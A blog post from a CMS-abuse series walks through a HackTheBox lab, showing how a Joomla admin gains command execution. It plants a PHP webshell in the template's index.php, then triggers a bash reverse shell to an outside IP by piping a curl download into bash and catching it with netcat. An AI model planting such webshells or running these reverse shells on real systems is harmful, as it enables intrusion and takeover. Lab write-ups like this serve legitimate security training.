---
layout: post
categories: [Abusing CMSs]
---

<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/main/images/joomla-removebg-preview.png" height="130" width="180">

# Introduction

- CTF: **Enterprise** on *HackTheBox*.

- This post is the fourth part of the list **"Abusing CMS"**.

I'm going to explain how to gain RCE from inside a **Joomla** as admin. If you want to enumerate a Joomla you can use **Joomscan**, a tool developed by **OWASP** which can be really useful to find more interesting information

# Exploitation

The way to execute commands it's really similar to the technique in Wordpress, however once you are logged in as admin or privileges you may be seeing something like this:

<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/main/images/joomla-dashboard.png">

Now go to **"Extensions"** --> **"Templates"** --> **"Templates"**

Click on the active template of the server, in my case it's called "**Protostar**", and you should see the files of the webpage. To execute commands edit the index.php and in the php code add a simple webshell throught the *cmd* parameter.

```php
system($_REQUEST['cmd']);
```

And click on **"Save"**
<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/main/images/joomla-editor.png">

At this point, if you go to the index.php or to the edited php file you can add ***"?cmd=whoami"*** to check the RCE.

Now you just have to send a reverse shell to get an interactive session on the victim machine. I will be using the same classic reverse shell from the other post (Abusing Wordpress), create an index.html with the content of a reverse shell:

```sh
#!/bin/bash

bash -i >& /dev/tcp/10.10.16.6/443 0>&1
```

Start a simple http server:
```sh
python3 -m http.server 80
```

And now if you make a request (with curl) in the webshell to your http server and add a pipe and **'bash'**. It executes the content of your index with bash, so it sends a reverse shell to your netcat listener.

So before you make the request start a netcat listener:

```sh
nc -nlvp 443
```

<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/main/images/joomla-rce.png">

And if all works as expected you should receive an interactive session.

<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/main/images/joomla-shell.png">

# References

```
https://github.com/OWASP/joomscan
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla
https://www.getastra.com/blog/security-audit/joomla-penetration-testing/
```

# Conclusion

This is a simple tutorial to execute commands once you have gained access to a Joomla admin panel by editing the PHP code

And thats's all

[Go back to top](#)


